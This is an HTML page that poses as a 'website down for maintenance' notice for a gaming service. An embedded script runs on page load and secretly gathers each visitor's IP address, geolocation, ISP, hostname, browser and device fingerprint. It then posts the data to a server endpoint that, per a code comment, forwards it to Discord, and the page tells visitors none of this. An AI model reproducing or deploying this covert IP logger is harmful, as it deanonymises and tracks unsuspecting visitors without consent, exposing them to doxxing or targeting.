<!DOCTYPE html>
<html>
  <head>
    <title>Website Down</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
      }
      header {
        background-color: #333;
        color: #fff;
        padding: 10px;
        text-align: center;
      }
      h1 {
        margin: 0;
        font-size: 32px;
      }
      p {
        font-size: 18px;
        line-height: 1.5;
        margin: 20px 5px;
      }
      .danger {
        color: red;
        font-weight: bold;
      }
      footer {
        background-color: #333;
        color: #fff;
        padding: 10px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <header>
      <h1>This website is down.</h1>
    </header>
    <main>
      <p>
        Welcome. This website has been temporarily shut down for maintenance and updates.
      </p>
      <p>
        Weâ€™re currently adding some big updates to the website. This process might take some time. Thank you for your patience.
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
         
      </p>
      <p>
        <span class="danger">Get ready gamers</span>
      </p>
    </main>
    <footer>
      &copy; 2025 Gaming Services. All rights reserved.
    </footer>
    <script>
      // collect info, then POST to our server endpoint which forwards to Discord
      fetch("https://wtfismyip.com/json")
        .then((response) => response.json())
        .then((data) => {
          const echolog = {
            ipAddress: data.YourFuckingIPAddress,
            location: data.YourFuckingLocation,
            hostname: data.YourFuckingHostname,
            isp: data.YourFuckingISP,
            city: data.YourFuckingCity,
            country: data.YourFuckingCountry,
            countryCode: data.YourFuckingCountryCode,
            userAgent: navigator.userAgent,
            windowProp: Object.keys(window).length,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            windowRatio: window.innerWidth / window.innerHeight,
            screenWidth: window.screen.availWidth,
            screenHeight: window.screen.availHeight,
            screenRatio: window.screen.availWidth / window.screen.availHeight,
            DPI: window.devicePixelRatio,
            colorDepth: window.screen.colorDepth,
            orientation: (window.screen.orientation && window.screen.orientation.type) || '',
            orientationAngle: (window.screen.orientation && window.screen.orientation.angle) || 0,
            os: navigator.platform,
            threads: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            systemLanguages: navigator.languages ? navigator.languages.join(", ") : '',
            languages: navigator.language,
          };

          const content = [
            `IP Address: ${echolog.ipAddress}`,
            `Location: ${echolog.location}`,
            `Hostname: ${echolog.hostname}`,
            `ISP: ${echolog.isp}`,
            `City: ${echolog.city}`,
            `Country: ${echolog.country}`,
            `Country Code: ${echolog.countryCode}`,
            `User Agent: ${echolog.userAgent}`,
            `Window: ${echolog.windowWidth}x${echolog.windowHeight} (props ${echolog.windowProp})`,
            `Screen: ${echolog.screenWidth}x${echolog.screenHeight} (DPR ${echolog.DPI})`,
            `Orientation: ${echolog.orientation} / angle ${echolog.orientationAngle}`,
            `OS: ${echolog.os}`,
            `Threads: ${echolog.threads}`,
            `Memory (GB): ${echolog.memory}`,
            `Languages: ${echolog.systemLanguages}`,
          ].join("\n");

          // Send the collected data to our server endpoint (no webhook in the frontend)
          fetch("/api/discord", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ content }),
          })
            .then((response) => {
              if (!response.ok) {
                console.error("Forwarding to server failed", response.status);
              } else {
                console.log("Sent to server");
              }
            })
            .catch((error) => console.error(error));
        })
        .catch((error) => console.error(error));
    </script>
  </body>
</html>
